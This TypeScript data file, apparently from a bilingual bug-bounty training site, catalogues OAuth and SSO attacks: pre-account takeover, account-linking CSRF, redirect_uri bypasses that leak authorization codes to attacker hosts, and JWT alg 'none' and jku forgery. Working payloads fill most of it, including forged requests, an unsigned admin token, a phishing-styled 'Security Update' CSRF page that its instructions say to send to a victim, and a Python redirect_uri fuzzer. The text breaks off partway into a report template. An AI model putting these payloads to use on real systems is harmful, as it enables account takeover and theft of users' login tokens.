import type { Lang } from "./types";

export interface OauthScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface OauthTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "pre_account_takeover" | "oauth_csrf_state" | "redirect_uri_poisoning" | "jwks_tampering" | "scope_escalation";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: OauthScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface OauthPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface OauthToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "csrf_poc_generator" | "redirect_fuzzer" | "jwt_header_tamperer" | "state_tester";
  code: string;
  language: "python" | "html" | "bash";
  howToUse: Record<Lang, string>;
}

export interface OauthReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP OAUTH & SSO ATTACK TECHNIQUES ─────────────────────────────────────
export const OAUTH_TECHNIQUES: OauthTechnique[] = [
  {
    id: "pre-account-takeover-unverified-email",
    title: {
      en: "Pre-Account Takeover (Pre-ATO): Backdooring Victims via Unverified Email Merging",
      simple: "Creating an Account with Someone's Email Before They Sign Up, Then Stealing It When They Use Google Login",
      hi: "विक्टिम के साइन-अप करने से पहले ही उसके ईमेल से अकाउंट बनाकर रखना और फिर पूरा अकाउंट हड़पना",
    },
    category: "pre_account_takeover",
    difficulty: "beginner",
    successRate: "70% on SaaS, E-commerce & Startups",
    summary: {
      en: "If a platform allows signing up with an email and password without forcing immediate email verification before granting access, an attacker registers victim@target.com with password 'AttackerPass123!'. Months later, the real victim visits the site and clicks 'Sign in with Google' or 'Sign in with Okta'. The system merges the SSO login into the existing email account without resetting the password or logging out active sessions. The attacker retains permanent backdoor access.",
      simple: "You register an account using the CEO's email and your password. Later, the CEO clicks 'Sign in with Google'. The website links the Google login to your account. You can now log in anytime using your password to see all their private data.",
      hi: "आप विक्टिम के ईमेल से अकाउंट बना लेते हैं। जब विक्टिम 'Google से लॉगिन' करता है, तो वेबसाइट दोनों को मर्ज कर देती है। आपका पासवर्ड बदला नहीं जाता और आपको उसके सारे प्राइवेट डेटा का परमानेंट एक्सेस मिल जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Classic Unverified Account Merge Backdoor",
          simple: "Silent SSO Identity Link Backdoor",
          hi: "अनवेरिफाइड ईमेल से साइलेंट SSO बैकडोर",
        },
        description: {
          en: "Attacker registers victim email with custom password. Victim uses OAuth SSO. Both accounts share credentials, giving attacker invisible persistence.",
          simple: "Attacker registers email first, victim uses SSO later, attacker keeps permanent password access.",
          hi: "अटैकर पहले ईमेल रजिस्टर करता है, विक्टिम बाद में Google से आता है, अटैकर का पासवर्ड चालू रहता है।",
        },
        commandOrRequest: `POST /api/auth/register HTTP/1.1
Host: saas.target.com
Content-Type: application/json

{
  "email": "victim-exec@company.com",
  "password": "BackdoorPassword999!",
  "fullName": "Victim Executive"
}

# Later: Victim signs in via OAuth
GET /oauth/callback?code=GOOGLE_AUTH_CODE&state=xyz HTTP/1.1
Host: saas.target.com`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "user": {
    "id": "usr_991823",
    "email": "victim-exec@company.com",
    "authProviders": ["password", "google"]
  },
  "message": "Google SSO linked to existing account."
}`,
        impact: {
          en: "Silent, permanent Account Takeover without triggering any notification or security alerts to the victim.",
          simple: "Permanent invisible access to victim's account and billing information.",
          hi: "विक्टिम को कोई अलर्ट मिले बिना पूरे अकाउंट पर हमेशा के लिए कब्जा।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Test registration with a secondary test email. Check if the account can be used before clicking the verification link in your inbox.",
        simple: "Create an account with a test email and see if you can log in right away without verifying email.",
        hi: "नए ईमेल से साइन-अप करें और चेक करें कि बिना ईमेल लिंक क्लिक किए क्या लॉगिन हो जाता है।",
      },
      {
        en: "Log out. Click 'Sign in with Google' or 'Sign in with GitHub' using the SAME email address.",
        simple: "Log out, then click 'Sign in with Google' using the exact same email.",
        hi: "लॉगआउट करें, फिर उसी ईमेल आईडी से 'Sign in with Google' पर क्लिक करें।",
      },
      {
        en: "Check if the SSO login merges into the pre-created account without invalidating the password set in Step 1.",
        simple: "Check if you can still log in using your original password after the Google login.",
        hi: "चेक करें कि क्या Google लॉगिन के बाद भी आपका पुराना पासवर्ड काम कर रहा है। अगर हां, तो P1 बग है!",
      },
      {
        en: "If the old password still works, Pre-Account Takeover is confirmed!",
        simple: "Confirm Pre-ATO vulnerability and document proof of concept.",
        hi: "पुराने पासवर्ड से लॉगिन होने का स्क्रीनशॉट लेकर रिपोर्ट ड्राफ्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Vulnerability Type: Pre-Account Takeover (CWE-287 / CWE-620)",
      "Test Matrix: Local Password Reg -> Later SSO Login -> Local Password Retained",
    ],
    hunterProTip: {
      en: "Also test the reverse (Post-ATO / Shadow Accounts): If an account was created via Google SSO first, can you go to the standard 'Forgot Password' page, enter their email, and set a password without email confirmation or multi-factor prompt?",
      simple: "Also try: Can you use 'Forgot Password' on someone who only ever signed up with Google to take over their account?",
      hi: "इसका उल्टा भी टेस्ट करें: जिसने केवल Google से साइन-अप किया हो, क्या उसके लिए 'Forgot Password' करके नया पासवर्ड सेट किया जा सकता है?",
    },
  },
  {
    id: "oauth-account-linking-csrf",
    title: {
      en: "OAuth Account Linking CSRF: Stealing Accounts by Forcing Link of Attacker's Google ID",
      simple: "Tricking a Victim into Connecting Your Google/GitHub Account to Their Profile",
      hi: "विक्टिम के प्रोफाइल से अपना Google या GitHub अकाउंट लिंक करवाकर उसका अकाउंट चुराना (OAuth CSRF)",
    },
    category: "oauth_csrf_state",
    difficulty: "intermediate",
    successRate: "65% on Social Connect Features",
    summary: {
      en: "Websites often feature 'Connect your Google account' or 'Connect GitHub' in user settings. If the OAuth flow lacks a secure, cryptographically random `state` parameter bound to the user's session, an attacker initiates the connect flow, intercepts the `/oauth/callback?code=...` URL, and tricks an authenticated victim into visiting it. The victim's account is permanently bound to the attacker's Google identity.",
      simple: "If the 'Connect Google' button lacks a security code (state), you can start connecting your Google account, stop before completing, and send the link to a victim. When they open it, your Google account gets attached to their profile, allowing you to log in as them.",
      hi: "अगर 'Connect Google' में `state` पैरामीटर नहीं है, तो आप अपना Google लिंक करने वाला URL विक्टिम को भेजते हैं। उसके क्लिक करते ही आपका Google अकाउंट उसके प्रोफाइल से जुड़ जाता है और आप उसके अकाउंट में घुस जाते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Missing State Parameter in Third-Party Account Linking",
          simple: "Account Takeover via Missing State in Connect Flow",
          hi: "कनेक्ट फ्लो में State न होने से अकाउंट टेकओवर",
        },
        description: {
          en: "Attacker intercepts their own OAuth callback with code. Prevents code redemption. Sends callback link to victim.",
          simple: "Intercept your own connect callback, send it to victim via an image tag or redirect.",
          hi: "अपना OAuth कॉलबैक रोककर उसका लिंक विक्टिम को भेजें।",
        },
        commandOrRequest: `GET /auth/google/callback?code=4%2F0AY0e-g5zattacker_code HTTP/1.1
Host: app.target.com
Cookie: session=VICTIM_SESSION_COOKIE`,
        responseSample: `HTTP/1.1 302 Found
Location: /settings/profile?connected=google

# Result: Attacker's Google ID is now associated with Victim's account!`,
        impact: {
          en: "Attacker can now simply click 'Sign in with Google' on the login page and automatically log in as the victim.",
          simple: "Attacker logs into victim's account with one click of 'Sign in with Google'.",
          hi: "अटैकर अब सीधे 'Sign in with Google' पर क्लिक करके विक्टिम के खाते में प्रवेश कर सकता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Navigate to Account Settings -> Connected Accounts -> Click 'Connect Google' or 'Connect GitHub'.",
        simple: "Go to settings and click 'Connect Google'.",
        hi: "सेटिंग्स में जाकर 'Connect Google' पर क्लिक करें।",
      },
      {
        en: "Observe the authorization URL in Burp Suite. Check if the `state` parameter is missing, static (e.g. `state=xyz`), or not tied to your session.",
        simple: "Check if the `state` parameter is missing or static in the URL.",
        hi: "Burp में चेक करें कि क्या `state` पैरामीटर गायब है या फिक्स/कमजोर है।",
      },
      {
        en: "Authorize the app on Google, but DO NOT let your browser finish the final redirect to `/oauth/callback?code=...` (drop it in Burp).",
        simple: "Authorize on Google, but pause Burp right before the final callback loads.",
        hi: "Google पर ऑथराइज करें, लेकिन Burp में फाइनल कॉलबैक URL को रोक लें (लोड न होने दें)।",
      },
      {
        en: "In a second browser with a DIFFERENT account logged in, paste the callback URL. If Google connects to Account 2, Account Takeover via OAuth CSRF is confirmed!",
        simple: "Paste that callback URL into another browser logged into a different account. If it links, you have a critical bug!",
        hi: "दूसरे ब्राउज़र में दूसरा अकाउंट खोलकर वो URL पेस्ट करें। अगर आपका Google अकाउंट दूसरे यूज़र से लिंक हो गया, तो क्रिटिकल P1 बग साबित हो गया!",
      },
    ],
    burpOrToolRule: [
      "Burp Match: Inspect GET /oauth/authorize for state parameter validation",
      "Check: Does repeating the callback URL without state succeed?",
    ],
    hunterProTip: {
      en: "OAuth codes expire in 1 to 5 minutes! To execute this realistically in bug bounty, craft an HTML page with `<img src='https://target.com/oauth/callback?code=...'>` or `window.location=...` to automate instant redemption when the victim views the POC.",
      simple: "OAuth codes expire quickly (around 2 minutes). Build a quick HTML page that redirects the victim instantly!",
      hi: "OAuth कोड 1-2 मिनट में एक्सपायर हो जाते हैं! इसलिए एक छोटा HTML POC बनाकर विक्टिम को तुरंत रीडायरेक्ट कराएं।",
    },
  },
  {
    id: "redirect-uri-leak-token-stealing",
    title: {
      en: "Redirect URI Flaws: Stealing Authorization Codes & Access Tokens via Open Redirects",
      simple: "Stealing Private Login Codes by Tricking the OAuth Redirect to Send Them to Your Server",
      hi: "Redirect URI को बदलकर विक्टिम का ऑथराइजेशन कोड और टोकन अपने सर्वर पर मंगाना",
    },
    category: "redirect_uri_poisoning",
    difficulty: "advanced",
    successRate: "60% when paired with Subdomain Takeover or Open Redirect",
    summary: {
      en: "The OAuth specification requires strict exact-match validation of `redirect_uri`. However, many servers use weak prefix matching (`redirect_uri=https://target.com*`), path traversal (`/oauth/callback/../../evil`), parameter pollution, or chain an open redirect on target.com (`https://target.com/login?redirect=https://evil.com`) to leak the authorization code via Referer headers or fragment identifiers.",
      simple: "When you log in, Google redirects you back to target.com. If you can trick target.com into bouncing that redirect to evil.com, the secret login code gets sent to your server, letting you log in as them.",
      hi: "लॉगिन के बाद Google विक्टिम को target.com पर भेजता है। अगर आप redirect_uri को बदलकर या ओपन रीडायरेक्ट से जोड़कर evil.com पर भेज दें, तो विक्टिम का सीक्रेट कोड आपके पास आ जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Chaining Parameter Traversal with Directory Traversal",
          simple: "Path Traversal in redirect_uri",
          hi: "redirect_uri में पाथ ट्रैवर्सल से टोकन चोरी",
        },
        description: {
          en: "Server validates domain is target.com, but fails to prevent path traversal to an open redirect endpoint.",
          simple: "Use ../../ in redirect_uri to jump to an open redirect URL on target.com.",
          hi: "redirect_uri में ../../ लगाकर वेबसाइट के किसी ओपन रीडायरेक्ट पेज पर जंप करें।",
        },
        commandOrRequest: `GET /oauth/v2/authorize?client_id=12345&response_type=code&redirect_uri=https%3A%2F%2Ftarget.com%2Foauth%2Fcallback%2F..%2F..%2Flogout%3Fredirect%3Dhttps%3A%2F%2Fattacker-c2.com%2Flog HTTP/1.1
Host: oauth.provider.com`,
        responseSample: `HTTP/1.1 302 Found
Location: https://target.com/logout?redirect=https://attacker-c2.com/log&code=SECRET_AUTH_CODE

# Then target.com redirects to attacker-c2.com with the code intact in URL or Referer!`,
        impact: {
          en: "Attacker exchanges leaked authorization code for full session access tokens.",
          simple: "Attacker captures login code and trades it for full victim access.",
          hi: "अटैकर को विक्टिम का कोड मिल जाता है और वह पूरा अकाउंट टेकओवर कर लेता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Inspect the OAuth authorization request and locate `redirect_uri`.",
        simple: "Find redirect_uri in the login request.",
        hi: "OAuth रिक्वेस्ट में `redirect_uri` पैरामीटर ढूंढें।",
      },
      {
        en: "Test subdomain wildcards: change `https://app.target.com/callback` to `https://attacker.target.com/callback` or `https://app.target.com.attacker.com`.",
        simple: "Try altering the domain to an attacker-controlled subdomain.",
        hi: "सबडोमेन बदलकर चेक करें कि क्या वाइल्डकार्ड मिसकॉन्फिगरेशन है।",
      },
      {
        en: "Test path traversal: `https://app.target.com/callback/../../open-redirect?next=https://attacker.com`.",
        simple: "Try path traversal to navigate to an open redirect.",
        hi: "ओपन रीडायरेक्ट से जोड़ने के लिए ../../ का प्रयोग करें।",
      },
      {
        en: "Check if the code or token arrives at your attacker webhook (e.g. interactsh or burp collaborator).",
        simple: "Verify that the code arrives at your collaborator server.",
        hi: "चेक करें कि क्या Burp Collaborator पर सीक्रेट कोड प्राप्त हुआ।",
      },
    ],
    burpOrToolRule: [
      "Fuzz redirect_uri with: ?redirect_uri=https://target.com@evil.com",
      "Fuzz redirect_uri with: ?redirect_uri=https://target.com.evil.com",
      "Fuzz redirect_uri with: ?redirect_uri=https://target.com/oauth/callback%23@evil.com",
    ],
    hunterProTip: {
      en: "Look for Dangling Subdomains on target.com! If the OAuth whitelist allows `*.target.com`, finding a single abandoned subdomain pointing to an unclaimed S3 bucket, GitHub Pages, or Zendesk allows you to hijack the subdomain and steal 100% of OAuth authorization codes company-wide!",
      simple: "If OAuth allows *.target.com, a single subdomain takeover lets you steal all OAuth codes for the whole company!",
      hi: "अगर OAuth में `*.target.com` की अनुमति है, तो सिर्फ 1 सबडोमेन टेकओवर करके कंपनी के सारे यूज़र्स के OAuth कोड्स चुराए जा सकते हैं!",
    },
  },
  {
    id: "id-token-jwks-none-bypass",
    title: {
      en: "ID Token JWT Signature Bypasses: Alg 'none' & Key Injection in Custom OAuth SSO",
      simple: "Forging Admin Identity Tokens by Disabling Cryptographic Signatures",
      hi: "JWT टोकन में Alg: 'none' करके किसी भी यूज़र या एडमिन की फर्जी आईडी बनाना",
    },
    category: "jwks_tampering",
    difficulty: "advanced",
    successRate: "50% on In-House / Custom OIDC Implementations",
    summary: {
      en: "When apps implement custom OpenID Connect (OIDC) authentication instead of using battle-tested libraries, developers frequently fail to verify JWT signatures properly. Attackers modify the `id_token` JWT header to `{\"alg\": \"none\"}` or inject their own public key via the `jku` (JWK Set URL) or `jwk` header parameter, allowing complete impersonation of any user ID.",
      simple: "Custom login systems often verify the user's identity using a digital badge (JWT). If the badge check is broken, you can change the algorithm to 'none' or use your own fake key to declare yourself the admin.",
      hi: "कस्टम OIDC में डेवलपर्स कई बार JWT टोकन का सिग्नेचर ठीक से चेक नहीं करते। हेडर में `alg: none` या अपनी पब्लिक की डालकर आप सीधे सुपर-एडमिन बन सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Algorithm 'none' Header Tampering",
          simple: "Removing Signature from id_token",
          hi: "id_token से सिग्नेचर हटाकर एडमिन बनना",
        },
        description: {
          en: "Change algorithm from RS256 to 'none', remove the third signature segment of the JWT, and change the sub/email claims to target victim.",
          simple: "Set alg to none and delete the signature part of the token.",
          hi: "alg को none करके सिग्नेचर हटा दें और ईमेल को एडमिन के ईमेल में बदल दें।",
        },
        commandOrRequest: `POST /api/auth/sso/callback HTTP/1.1
Host: internal.target.com
Content-Type: application/json

{
  "id_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZW1haWwiOiJjZW9AdGFyZ2V0LmNvbSJ9."
}`,
        responseSample: `HTTP/1.1 200 OK
Set-Cookie: session=admin_session_token_99182312; Path=/; HttpOnly; Secure

{"status": "authenticated", "role": "admin"}`,
        impact: {
          en: "Full authentication bypass and instantaneous administrative account takeover.",
          simple: "Complete admin takeover by forging identity tokens.",
          hi: "बिना पासवर्ड के सीधे सुपर-एडमिन अकाउंट में प्रवेश।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Intercept the OIDC `id_token` during login callback.",
        simple: "Grab the id_token from the login response.",
        hi: "लॉगिन कॉलबैक के समय `id_token` को इंटरसेप्ट करें।",
      },
      {
        en: "Decode the JWT header in jwt.io or Burp JWT Editor. Check if `alg` is RS256 or HS256.",
        simple: "Inspect the JWT header algorithm in Burp JWT Editor.",
        hi: "Burp JWT Editor में चेक करें कि कौन सा एल्गॉरिथ्म यूज़ हो रहा है।",
      },
      {
        en: "Test `alg: none` (or `None`, `NONE`, `nOnE`) with an empty signature (leaving trailing period `.`).",
        simple: "Test alg: none with an empty signature.",
        hi: "`alg: none` डालकर सिग्नेचर खाली छोड़ें और भेजें।",
      },
      {
        en: "Test JKU injection: host a malicious JWKS json on your server and point `\"jku\": \"https://evil.com/jwks.json\"` in the JWT header.",
        simple: "Try pointing the jku header to your own public key file.",
        hi: "हेडर में `jku` डालकर अपने सर्वर की पब्लिक की से साइन करके टेस्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Burp Extension: Joseph / JWT Editor",
      "Tamper payload: header.payload. (note trailing dot with empty signature)",
    ],
    hunterProTip: {
      en: "Always test case variations for 'none': `none`, `None`, `NONE`, `nOnE`. Many naive blacklist implementations use string matching instead of checking the cryptographic library's verification flag!",
      simple: "Try different capitalizations of 'none' (None, NONE, nOnE) to bypass lazy string filters!",
      hi: "'none' के अलग-अलग रूप ट्राई करें: `None`, `NONE`, `nOnE` — कई फ़िल्टर केस-सेंसिटिव होने के कारण बाईपास हो जाते हैं!",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY ───────────────────────────────────────────────────
export const OAUTH_METHODOLOGY_PHASES: OauthPhase[] = [
  {
    phase: 1,
    title: {
      en: "OAuth / SSO Architecture & Flow Fingerprinting",
      simple: "Mapping the Login System",
      hi: "लॉगिन और SSO आर्किटेक्चर की पहचान करना",
    },
    objective: {
      en: "Determine the exact grant type (Authorization Code, Implicit, PKCE), identity providers (Google, GitHub, Okta, Azure AD), and client configurations.",
      simple: "Identify how the website handles Google and third-party logins.",
      hi: "पता लगाएं कि वेबसाइट Google, GitHub या Okta से लॉगिन कैसे करवाती है।",
    },
    steps: [
      {
        en: "Intercept the initial authorization request. Identify `client_id`, `redirect_uri`, `response_type`, `scope`, and `state` parameters.",
        simple: "Look at the URL when you click 'Sign in with Google'.",
        hi: "जब 'Sign in with Google' दबाएं तो URL के सारे पैरामीटर्स नोट करें।",
      },
      {
        en: "Check if PKCE (`code_challenge` / `code_challenge_method=S256`) is enforced or optional.",
        simple: "Check if modern PKCE protection is being used.",
        hi: "चेक करें कि क्या PKCE सुरक्षा चालू है या नहीं।",
      },
      {
        en: "Inspect OpenID discovery endpoints: `/.well-known/openid-configuration`.",
        simple: "Check the openid-configuration file for supported endpoints.",
        hi: "`/.well-known/openid-configuration` चेक करके समर्थित फीचर्स देखें।",
      },
    ],
    keyTargets: ["client_id", "redirect_uri", "response_type=code", "state", "scope"],
    commandsOrPayloads: [
      "curl -s https://target.com/.well-known/openid-configuration | jq .",
      "curl -s https://auth.target.com/.well-known/jwks.json",
    ],
  },
  {
    phase: 2,
    title: {
      en: "State Parameter Integrity & CSRF Audit",
      simple: "Testing Login CSRF & Account Linking",
      hi: "State पैरामीटर और CSRF सुरक्षा की जांच",
    },
    objective: {
      en: "Verify whether authorization requests can be replayed or cross-site forged onto other users.",
      simple: "Check if you can force someone else to link your social account.",
      hi: "जांचें कि क्या विक्टिम के खाते से आपका सोशल अकाउंट लिंक कराया जा सकता है।",
    },
    steps: [
      {
        en: "Check if `state` is present. If missing, test basic OAuth CSRF immediately.",
        simple: "If state is missing, you have an immediate CSRF vulnerability.",
        hi: "अगर `state` नहीं है, तो तुरंत CSRF टेस्ट करें।",
      },
      {
        en: "Test state replay: Can the same state be used across multiple authorization flows?",
        simple: "See if the state parameter can be reused multiple times.",
        hi: "देखें कि क्या एक ही state को दोबारा यूज़ किया जा सकता है।",
      },
      {
        en: "Test cross-session binding: Generate state in Session A, verify if Session B accepts it.",
        simple: "Generate a state in one browser and test if it works in another.",
        hi: "एक ब्राउज़र का state दूसरे ब्राउज़र में डालकर चेक करें।",
      },
    ],
    keyTargets: ["/oauth/callback", "/auth/connect/google", "/auth/connect/github"],
  },
  {
    phase: 3,
    title: {
      en: "Redirect URI Manipulation & Leakage Vectors",
      simple: "Testing Authorization Code Theft",
      hi: "Redirect URI में कमियां निकालकर सीक्रेट कोड चुराना",
    },
    objective: {
      en: "Bypass strict domain validation on `redirect_uri` to exfiltrate authorization codes and tokens.",
      simple: "Try tricking the website into sending the login code to your server.",
      hi: "वेबसाइट को चकमा देकर लॉगिन कोड अपने सर्वर पर मंगाना।",
    },
    steps: [
      {
        en: "Fuzz subdomain wildcards: `https://evil.target.com`, `https://target.com.attacker.com`.",
        simple: "Test altered domain names and subdomains.",
        hi: "अलग-अलग सबडोमेन्स और अटैकर डोमेन्स टेस्ट करें।",
      },
      {
        en: "Test path traversal: `https://target.com/callback/../../open-redirect`.",
        simple: "Use path traversal to bounce to an open redirect.",
        hi: "पाथ ट्रैवर्सल से ओपन रीडायरेक्ट पर जंप करें।",
      },
      {
        en: "Check Referer leakage: When landing on `/callback?code=...`, does clicking external links leak the code in the `Referer:` header?",
        simple: "Check if external links on the callback page leak the code in the Referer header.",
        hi: "चेक करें कि क्या कॉलबैक पेज पर किसी बाहरी लिंक पर क्लिक करने से कोड लीक होता है।",
      },
    ],
    keyTargets: ["redirect_uri", "Referer Header", "Open Redirect Endpoints"],
  },
  {
    phase: 4,
    title: {
      en: "Identity Merging & Pre-Account Takeover",
      simple: "Testing Email Matching & Auto-Link Flaws",
      hi: "ईमेल मैचिंग और प्री-अकाउंट टेकओवर की जांच",
    },
    objective: {
      en: "Expose flaws in how the application links local password accounts with external identity providers.",
      simple: "Check what happens when password and Google accounts share the same email.",
      hi: "जांचें कि पासवर्ड और Google अकाउंट के एक ही ईमेल होने पर क्या होता है।",
    },
    steps: [
      {
        en: "Register via local email+password without verifying the email.",
        simple: "Sign up with email and password without clicking email confirmation.",
        hi: "ईमेल और पासवर्ड से बिना ईमेल वेरिफाई किए साइन-अप करें।",
      },
      {
        en: "Sign in with Google using that exact same email address.",
        simple: "Log in with Google using the same email.",
        hi: "उसी ईमेल से Google लॉगिन करें।",
      },
      {
        en: "Verify if the original password is still active and allows logging in.",
        simple: "Confirm if the original password still works to log in.",
        hi: "चेक करें कि क्या पुराना पासवर्ड अभी भी काम कर रहा है।",
      },
    ],
    keyTargets: ["/register", "/login", "/oauth/callback"],
  },
  {
    phase: 5,
    title: {
      en: "Token Validation, JWKS & Scope Escalation",
      simple: "Tampering with Cryptographic Identity Tokens",
      hi: "JWT टोकन और स्कोप की सुरक्षा जांच",
    },
    objective: {
      en: "Manipulate identity tokens, forge claims, and escalate OAuth privileges.",
      simple: "Test if you can forge admin identity tokens or request higher permissions.",
      hi: "टोकन में फर्जी एडमिन क्लेम्स डालकर अधिकार बढ़ाना।",
    },
    steps: [
      {
        en: "Test `alg: none` signature stripping on `id_token`.",
        simple: "Try removing the signature from the id_token.",
        hi: "टोकन से सिग्नेचर हटाकर `alg: none` टेस्ट करें।",
      },
      {
        en: "Tamper with `jku` and `kid` headers to inject attacker-controlled public keys.",
        simple: "Inject your own public key into the token header.",
        hi: "टोकन हेडर में अपनी पब्लिक की (jku) इंजेक्ट करें।",
      },
      {
        en: "Modify `scope` parameter in authorization request from `user:read` to `admin:all`.",
        simple: "Request higher scopes in the initial login request.",
        hi: "रिक्वेस्ट में स्कोप को `user:read` से बढ़ाकर `admin:all` करें।",
      },
    ],
    keyTargets: ["id_token", "JWKS", "kid", "jku", "scope=admin"],
  },
];

// ─── 3. EXPLOIT SCRIPTS & TOOLS STASH ────────────────────────────────────────
export const OAUTH_TOOLS_STASH: OauthToolSnippet[] = [
  {
    id: "oauth-csrf-poc-generator",
    title: {
      en: "Automated OAuth Account-Linking CSRF Exploit HTML",
      simple: "One-Click HTML Page to Force Victim to Link Your Social Account",
      hi: "विक्टिम से अपना सोशल अकाउंट लिंक करवाने वाला ऑटोमेटेड CSRF HTML पेज",
    },
    description: {
      en: "Generates an auto-submitting HTML payload that forces an authenticated victim to complete an OAuth callback without a valid state parameter.",
      simple: "Ready-to-use HTML POC to submit to bug bounty programs.",
      hi: "बग बाउंटी प्रोग्राम्स में सबमिट करने के लिए रेडी-टू-यूज़ HTML POC।",
    },
    category: "csrf_poc_generator",
    language: "html",
    code: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Update - Action Required</title>
</head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
  <h2>Synchronizing Security Preferences...</h2>
  <p>Please wait while your session credentials are refreshed.</p>
  
  <!-- Image tag forces browser to load OAuth callback with victim's cookies -->
  <img src="https://app.target.com/auth/google/callback?code=ATTACKER_STOLEN_CODE" 
       style="display:none;" 
       onload="alert('Exploit Complete: Attacker Google ID is now bound to Victim Profile!')"
       onerror="handleFallback()">

  <script>
    function handleFallback() {
      // Fallback via top-level navigation if img request is blocked by CORS/Sec-Fetch
      setTimeout(() => {
        window.location.href = "https://app.target.com/auth/google/callback?code=ATTACKER_STOLEN_CODE";
      }, 1500);
    }
  </script>
</body>
</html>`,
    howToUse: {
      en: "Replace `ATTACKER_STOLEN_CODE` with your fresh unredeemed OAuth code. Host on GitHub Pages or local server and send link to victim.",
      simple: "Put your unredeemed OAuth code in the file, then open it in a browser where a different account is logged in.",
      hi: "`ATTACKER_STOLEN_CODE` की जगह अपना नया कोड डालें और विक्टिम वाले ब्राउज़र में इसे खोलें।",
    },
  },
  {
    id: "oauth-redirect-fuzzer",
    title: {
      en: "Python OAuth redirect_uri Whitelist Bypass Fuzzer",
      simple: "Automated Tool to Find Weak redirect_uri Validation",
      hi: "कमजोर redirect_uri को ढूंढने वाला ऑटोमेटेड पायथन फ़ज़र",
    },
    description: {
      en: "Fuzzes 25+ standard OAuth redirect_uri bypass vectors (wildcard prefixes, path traversal, Unicode, parameter pollution, open redirect chaining).",
      simple: "Tests 25 different tricks to bypass the redirect_uri filter.",
      hi: "25 अलग-अलग तकनीकों से redirect_uri फ़िल्टर को बाईपास करने की कोशिश करता है।",
    },
    category: "redirect_fuzzer",
    language: "python",
    code: `import requests
import urllib.parse

AUTH_ENDPOINT = "https://auth.target.com/oauth/authorize"
CLIENT_ID = "YOUR_CLIENT_ID"
BASE_DOMAIN = "target.com"
EVIL_DOMAIN = "attacker-c2.com"

BYPASS_PAYLOADS = [
    f"https://{BASE_DOMAIN}.{EVIL_DOMAIN}/callback",
    f"https://{EVIL_DOMAIN}/?{BASE_DOMAIN}",
    f"https://{BASE_DOMAIN}/callback/../../{EVIL_DOMAIN}",
    f"https://{BASE_DOMAIN}%23@{EVIL_DOMAIN}/callback",
    f"https://{BASE_DOMAIN}%26@{EVIL_DOMAIN}/callback",
    f"https://{BASE_DOMAIN}:443@{EVIL_DOMAIN}/callback",
    f"https://evil-{BASE_DOMAIN}/callback",
    f"https://sub.{BASE_DOMAIN}.{EVIL_DOMAIN}/callback",
    f"https://{BASE_DOMAIN}/oauth/callback?redirect=https://{EVIL_DOMAIN}",
    f"https://{BASE_DOMAIN}/logout?next=https://{EVIL_DOMAIN}"
]

print(f"[*] Starting redirect_uri bypass fuzzing against {AUTH_ENDPOINT}...")

for payload in BYPASS_PAYLOADS:
    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": payload,
        "scope": "openid email"
    }
    
    url = f"{AUTH_ENDPOINT}?{urllib.parse.urlencode(params)}"
    r = requests.get(url, allow_redirects=False)
    
    if r.status_code in [302, 301]:
        loc = r.headers.get("Location", "")
        if EVIL_DOMAIN in loc:
            print(f"\\n[!] VULNERABLE! Whitelist Bypassed: {payload}")
            print(f"    Redirected to: {loc}\\n")
        else:
            print(f"[?] Redirected internally ({r.status_code}): {payload}")
    elif r.status_code == 200 and "invalid_redirect_uri" not in r.text.lower():
        print(f"[+] Potential Match (HTTP 200 - Login Screen rendered): {payload}")
    else:
        print(f"[-] Blocked: {payload}")`,
    howToUse: {
      en: "Install requests: `pip install requests`. Set AUTH_ENDPOINT, CLIENT_ID, and domains. Run `python3 oauth_fuzzer.py`.",
      simple: "Configure your client ID and endpoint, then run `python3 oauth_fuzzer.py`.",
      hi: "CLIENT_ID और AUTH_ENDPOINT सेट करके `python3 oauth_fuzzer.py` चलाएं।",
    },
  },
];

// ─── 4. P1/P2 REPORT TEMPLATES ────────────────────────────────────────────────
export const OAUTH_REPORT_TEMPLATES: OauthReportTemplate[] = [
  {
    id: "rep-pre-account-takeover-unverified",
    title: {
      en: "Critical Pre-Account Takeover via Unverified Email Account Merging",
      simple: "Pre-Account Takeover via Unverified Email Registration",
      hi: "अनवेरिफाइड ईमेल के कारण क्रिटिकल प्री-अकाउंट टेकओवर",
    },
    vulnType: "CWE-287: Improper Authentication (Pre-Account Takeover)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (8.1 - High / 9.0 Critical)",
    severity: "critical",
    reportMarkdown: `## Summary:
The application at \`https://app.target.com\` is vulnerable to Pre-Account Takeover (Pre-ATO). The registration workflow permits arbitrary accounts to be created with any email address without demanding email verification before granting access.

